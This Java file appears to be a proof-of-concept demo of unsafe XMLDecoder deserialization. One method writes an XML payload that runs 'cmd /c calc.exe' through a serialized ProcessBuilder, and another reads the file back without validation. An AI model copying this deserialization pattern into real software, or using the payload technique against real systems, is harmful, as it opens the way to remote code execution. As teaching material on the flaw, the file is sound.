import java.beans.XMLDecoder;
import java.beans.XMLEncoder;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
 
public class DesertXML {
     
    public static void main(String[] args) throws Exception {
        
    	String filename = "desert.xml";
        boolean deserialize = true;
        
        if (deserialize) {
        	DesertXML.deserializeDesert(filename);
        } else {
        	DesertXML.serializeDesert(filename);
        }
    }
    
    
    public static void deserializeDesert(String filename) throws FileNotFoundException {
    	XMLDecoder decoder = new XMLDecoder(new BufferedInputStream(new FileInputStream(filename)));
    	 
        // Deserialise object from XML
        Object desert = decoder.readObject();
        decoder.close();
         
        System.out.println("The desert: " + ((Desert)desert).getName());
		System.out.println("Has a surface of: " + String.valueOf(((Desert)desert).getWidth()*((Desert)desert).getHeight()) );
    }
    
    
    public static void serializeDesert(String filename) throws FileNotFoundException {
    
		XMLEncoder encoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream(filename)));

		// Parameters to serialise		 
		java.lang.String[] command = {"cmd", "/c", "calc.exe"};
        java.lang.ProcessBuilder runtime = new ProcessBuilder();
        runtime.command(command);
     
        // Serialise object to XML
        encoder.writeObject(runtime);
        encoder.close();
         
        System.out.println("Payload written to: desert.xml");
    }
    
    public static class  Desert {
         
    	private String name;
    	private int width;
    	private int height;
		
    	
    	/**
		 * Getters and Setters
		 */
    	public String getName() {
			return name;
		}
		public void setName(String name) {
			this.name = name;
		}
		public int getWidth() {
			return width;
		}
		public void setWidth(int width) {
			this.width = width;
		}
		public int getHeight() {
			return height;
		}
		public void setHeight(int height) {
			this.height = height;
		}

         
    }
 
}